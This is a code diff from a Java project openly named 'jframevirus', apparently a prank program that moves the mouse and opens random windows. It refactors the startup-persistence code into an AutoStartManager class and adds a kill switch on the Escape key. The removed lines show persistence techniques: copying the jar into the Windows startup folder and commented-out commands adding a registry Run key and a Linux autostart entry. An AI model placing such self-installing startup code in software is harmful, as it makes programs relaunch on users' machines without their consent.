@@ -1,11 +1,7 @@
 package com.joo.jframevirus;
 
-import org.apache.commons.io.FileUtils;
-
 import java.awt.*;
 import java.awt.event.KeyEvent;
-import java.io.File;
-import java.io.IOException;
 
 public class MainController {
     private Dimension screenSize;
@@ -13,28 +9,10 @@ public class MainController {
 
     public MainController() {
         init();
-        addVirusToStartup();
+        AutoStartManager.getInstance().addVirusToStartup();
         startMouseMoving();
         startRandomFrame();
         setupWindowListener();
-    }
-
-    // TODO: test this in windows
-    private void addVirusToStartup() {
-        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
-            try {
-                // TODO: 5/15/22 Test this in windows
-                // Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Virus /t REG_SZ /d \"java -jar jframevirus.jar\"");
-                File file = new File("jframevirus.jar");
-                FileUtils.copyFile(file, new File("C:\\Windows\\Startup\\jframevirus.jar"));
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-        } else { // TODO: 5/15/22 Make this work on linux and mac
-            /*try {
-                Runtime.getRuntime().exec("echo \"java -jar jframevirus.jar\" >> ~/.config/autostart/jframevirus.desktop");
-            }*/
-        }
     }
 
     private void init() {
@@ -51,6 +29,9 @@ public class MainController {
         KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(e -> {
             if (e.getID() == KeyEvent.KEY_PRESSED) {
                 if (e.getKeyCode() == KeyEvent.VK_ESCAPE) {
+                    // Remove the virus from the startup programs
+                    AutoStartManager.getInstance().removeVirusFromStartup();
+                    // Exit the virus
                     System.exit(0);
                 }
             }
